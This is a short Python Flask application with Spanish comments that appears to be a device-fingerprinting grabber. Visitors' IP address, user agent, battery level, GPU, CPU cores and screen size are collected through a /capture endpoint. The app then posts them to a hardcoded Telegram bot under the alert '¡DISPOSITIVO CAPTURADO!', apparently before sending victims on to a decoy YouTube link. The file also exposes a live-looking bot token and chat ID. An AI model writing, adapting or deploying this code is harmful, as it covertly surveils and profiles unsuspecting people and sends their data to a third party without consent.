from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# CONFIGURACIÓN (Tus datos ya están aquí)
BOT_TOKEN = "8235852994:AAEwIUp0KMbULVbuba5ELH4ijklu9gAdFyM"
CHAT_ID = "7501019675"
FINAL_URL = "https://youtube.com/shorts/Vds1fJ0aTHw"

def send_to_telegram(data):
    msg = (
        "🚨 ¡DISPOSITIVO CAPTURADO! 🚨\n\n"
        f"🌐 IP: {data.get('ip')}\n"
        f"🔋 Batería: {data.get('battery')}\n"
        f"📱 Hardware: {data.get('gpu')}\n"
        f"🧠 Núcleos: {data.get('cores')}\n"
        f"📦 Navegador: {data.get('ua')}\n"
        f"📏 Pantalla: {data.get('screen')}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": msg})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    data['ip'] = request.remote_addr
    data['ua'] = request.headers.get('User-Agent')
    send_to_telegram(data)
    return {"status": "ok"}

if __name__ == '__main__':
    app.run(debug=True)
